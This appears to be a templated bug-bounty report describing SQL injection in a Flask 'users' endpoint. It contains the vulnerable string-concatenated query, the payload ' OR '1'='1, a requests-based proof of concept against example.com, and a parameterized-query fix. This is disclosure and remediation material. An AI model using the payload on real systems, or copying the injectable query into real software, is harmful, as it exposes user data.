# HackerOne Bug Report: SQL Injection in User Query

## Company Details
- **Company**: HackerOne
- **Program**: Public Bug Bounty
- **URL**: https://hackerone.com
- **Severity**: Low to Medium
- **Bounty Range**: $100-$1,000

## Vulnerability Details
- **Type**: SQL Injection
- **Location**: User Query Endpoint
- **Impact**: Potential unauthorized access to user data

## Description
The application contains a SQL injection vulnerability in the user query endpoint. The vulnerability exists because user input is directly concatenated into the SQL query without proper parameterization.

### Vulnerable Code
```python
@app.route('/users')
def get_users():
    name = request.args.get('name')
    query = f"SELECT * FROM users WHERE name = '{name}'"
    cursor.execute(query)
    return str(cursor.fetchall())
```

## Steps to Reproduce
1. Navigate to the users endpoint
2. Submit the following payload in the name parameter:
```
' OR '1'='1
```
3. Observe that the query returns all users due to the injected condition

## Proof of Concept
```python
import requests

# Normal request
r1 = requests.get('http://example.com/users?name=test')
print("Normal response:", r1.text)

# Malicious request
r2 = requests.get("http://example.com/users?name=' OR '1'='1")
print("Injected response:", r2.text)
```

## Impact
An attacker could:
1. Access unauthorized user data
2. Modify database queries
3. Potentially escalate to database administrator privileges

## Fix
Replace string concatenation with parameterized queries:

```python
@app.route('/users')
def get_users():
    name = request.args.get('name')
    query = "SELECT * FROM users WHERE name = ?"
    cursor.execute(query, (name,))
    return str(cursor.fetchall())
```

## Risk Factors
- **CVSS Score**: 6.5
- **Attack Complexity**: Low
- **Privileges Required**: None
- **User Interaction**: None

## References
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

## Timeline
- **Reported**: [Current Date]
- **Status**: New Submission
